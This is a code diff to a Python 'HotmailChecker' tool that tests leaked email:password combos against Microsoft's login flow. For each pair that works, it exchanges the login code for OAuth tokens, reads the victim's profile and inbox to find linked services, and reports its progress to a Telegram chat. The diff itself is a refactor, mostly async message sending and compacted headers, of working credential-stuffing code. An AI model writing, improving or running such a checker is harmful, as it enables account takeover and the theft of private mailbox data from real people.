@@ -1,5 +1,4 @@
 import os
-import sys
 import time
 import uuid
 import pycountry
@@ -8,6 +7,7 @@ import threading
 import concurrent.futures
 import random
 import re
+import asyncio
 from threading import Lock
 
 lock = Lock()
@@ -28,8 +28,14 @@ class HotmailChecker:
         self.progress_message_id = None
 
     def send_message(self, text, parse_mode='HTML'):
+        """Thread-safe message sender"""
         try:
-            self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode)
+            loop = asyncio.get_running_loop()
+            future = asyncio.run_coroutine_threadsafe(
+                self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
+                loop
+            )
+            future.result(timeout=15)
         except Exception as e:
             print(f"[SEND ERROR] {e}")
 
@@ -42,7 +48,7 @@ class HotmailChecker:
         print("[INFO] Progress thread started")
         while self.processed < self.total_combos and self.total_combos > 0:
             with lock:
-                pct = min((self.processed / self.total_combos * 100), 100) if self.total_combos > 0 else 0
+                pct = min((self.processed / self.total_combos * 100), 100)
                 bar = self.create_progress_bar(pct)
                 linked = sum(self.linked_accounts.values())
                 msg = f"""
@@ -57,10 +63,16 @@ class HotmailChecker:
 """
             try:
                 if self.progress_message_id:
-                    self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.progress_message_id, text=msg, parse_mode='HTML')
+                    loop = asyncio.get_running_loop()
+                    future = asyncio.run_coroutine_threadsafe(
+                        self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.progress_message_id, text=msg, parse_mode='HTML'),
+                        loop
+                    )
+                    future.result(timeout=10)
                 else:
                     sent = self.bot.send_message(chat_id=self.chat_id, text=msg, parse_mode='HTML')
                     self.progress_message_id = sent.message_id
+                    print(f"[INFO] Progress message created with ID: {self.progress_message_id}")
             except Exception as e:
                 print(f"[Progress Error] {e}")
             time.sleep(5)
@@ -89,24 +101,14 @@ class HotmailChecker:
 
     def get_capture(self, email, password, token, cid):
         try:
-            headers = {
-                "User-Agent": "Outlook-Android/2.0",
-                "Authorization": f"Bearer {token}",
-                "X-AnchorMailbox": f"CID:{cid}"
-            }
+            headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
             response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
             name = response.get('names', [{}])[0].get('displayName', 'Unknown')
             country = response.get('accounts', [{}])[0].get('location', 'Unknown')
             flag = self.get_flag(country)
 
-            # Inbox check
             url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
-            inbox_headers = {
-                "Host": "outlook.live.com",
-                "authorization": f"Bearer {token}",
-                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
-                "x-owa-sessionid": cid
-            }
+            inbox_headers = {"Host": "outlook.live.com", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "x-owa-sessionid": cid}
             inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text
 
             linked_services = []
@@ -164,12 +166,7 @@ class HotmailChecker:
             ppft = ppft_match.group(1)
 
             login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
-            r3 = session.post(post_url, data=login_data, headers={
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Origin": "https://login.live.com",
-                "Referer": r2.url
-            }, allow_redirects=False, timeout=15)
+            r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Origin": "https://login.live.com","Referer": r2.url}, allow_redirects=False, timeout=15)
 
             if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
                 return {"status": "BAD"}
@@ -183,14 +180,7 @@ class HotmailChecker:
                 return {"status": "BAD"}
 
             code = code_match.group(1)
-            token_data = {
-                "client_info": "1",
-                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
-                "grant_type": "authorization_code",
-                "code": code,
-                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
-            }
+            token_data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type": "authorization_code","code": code,"scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
             r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
 
             if r4.status_code != 200 or "access_token" not in r4.text:
@@ -207,7 +197,7 @@ class HotmailChecker:
         except requests.exceptions.Timeout:
             return {"status": "RETRY"}
         except Exception as e:
-            print(f"[Check Error] {e}")
+            print(f"[Check Account Error] {e}")
             return {"status": "RETRY"}
 
     def check_combo(self, email, password):
